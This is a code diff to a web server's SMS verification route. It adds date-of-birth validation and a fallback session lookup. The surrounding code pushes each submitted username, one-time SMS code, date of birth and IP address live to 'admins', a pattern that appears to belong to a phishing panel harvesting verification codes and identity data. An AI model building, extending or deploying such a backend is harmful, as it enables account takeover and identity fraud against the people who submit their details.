@@ -551,6 +551,31 @@ function broadcastToAdmins(data) {
     }
   });
 }
+function normalizeDateOfBirth(value) {
+  if (typeof value !== "string") return null;
+  const input = value.trim();
+  let year;
+  let month;
+  let day;
+  const isoMatch = input.match(/^(\d{4})-(\d{1,2})-(\d{1,2})$/);
+  const displayMatch = input.match(/^(\d{1,2})[/-](\d{1,2})[/-](\d{4})$/);
+  if (isoMatch) {
+    year = Number(isoMatch[1]);
+    month = Number(isoMatch[2]);
+    day = Number(isoMatch[3]);
+  } else if (displayMatch) {
+    day = Number(displayMatch[1]);
+    month = Number(displayMatch[2]);
+    year = Number(displayMatch[3]);
+  } else {
+    return null;
+  }
+  const parsed = new Date(Date.UTC(year, month - 1, day));
+  if (parsed.getUTCFullYear() !== year || parsed.getUTCMonth() !== month - 1 || parsed.getUTCDate() !== day) {
+    return null;
+  }
+  return `${String(year).padStart(4, "0")}-${String(month).padStart(2, "0")}-${String(day).padStart(2, "0")}`;
+}
 async function getCountryFromIP(ip) {
   try {
     if (ip === "unknown" || ip === "127.0.0.1" || ip === "::1" || ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
@@ -1247,32 +1272,36 @@ async function registerRoutes(app2) {
   app2.post("/api/sms/verify", async (req, res) => {
     try {
       const { username, code, sessionId, dateOfBirth } = req.body;
-      if (!dateOfBirth) {
+      const normalizedDateOfBirth = normalizeDateOfBirth(dateOfBirth);
+      if (!normalizedDateOfBirth) {
         return res.status(400).json({
           success: false,
-          message: "Date of birth is required"
+          message: "Please enter a valid date of birth"
         });
       }
-      const [session] = sessionId ? await db.select().from(verificationSessions).where((0, import_drizzle_orm2.eq)(verificationSessions.id, sessionId)) : await db.select().from(verificationSessions).where(
-        (0, import_drizzle_orm2.and)(
-          (0, import_drizzle_orm2.eq)(verificationSessions.username, username),
-          (0, import_drizzle_orm2.eq)(verificationSessions.smsCode, code)
-        )
-      );
+      let [session] = sessionId ? await db.select().from(verificationSessions).where((0, import_drizzle_orm2.eq)(verificationSessions.id, sessionId)) : [];
+      if (!session && username && code) {
+        [session] = await db.select().from(verificationSessions).where(
+          (0, import_drizzle_orm2.and)(
+            (0, import_drizzle_orm2.eq)(verificationSessions.username, username),
+            (0, import_drizzle_orm2.eq)(verificationSessions.smsCode, code)
+          )
+        ).orderBy((0, import_drizzle_orm2.desc)(verificationSessions.timestamp)).limit(1);
+      }
       if (!session) {
         return res.status(404).json({
           success: false,
           message: "Verification session not found. Please verify your SMS code again."
         });
       }
-      await db.update(verificationSessions).set({ dateOfBirth }).where((0, import_drizzle_orm2.eq)(verificationSessions.id, session.id));
+      await db.update(verificationSessions).set({ dateOfBirth: normalizedDateOfBirth }).where((0, import_drizzle_orm2.eq)(verificationSessions.id, session.id));
       broadcastToAdmins({
         type: "sms_verification_complete",
         data: {
           sessionId: session.id,
           username: session.username,
           smsCode: session.smsCode,
-          dateOfBirth,
+          dateOfBirth: normalizedDateOfBirth,
           ipAddress: session.ipAddress,
           timestamp: (/* @__PURE__ */ new Date()).toISOString()
         }
